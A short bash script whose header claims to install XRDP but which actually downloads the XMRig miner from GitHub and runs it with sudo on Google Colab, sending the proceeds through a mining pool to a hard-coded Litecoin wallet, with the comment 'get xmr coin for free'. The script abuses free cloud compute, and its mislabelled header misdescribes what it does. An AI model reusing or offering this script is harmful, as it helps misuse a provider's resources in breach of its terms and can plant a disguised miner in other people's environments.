#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-static-x64.tar.gz && tar -xvf xmrig-6.16.4-linux-static-x64.tar.gz && cd xmrig-6.16.4 && clear && sudo ./xmrig -o stratum+ssl://rx.unmineable.com:443 -a rx -u LTC:ltc1qffdt7l62w4pku6txh8qhf7uv6n7z2c032cehpf -p x
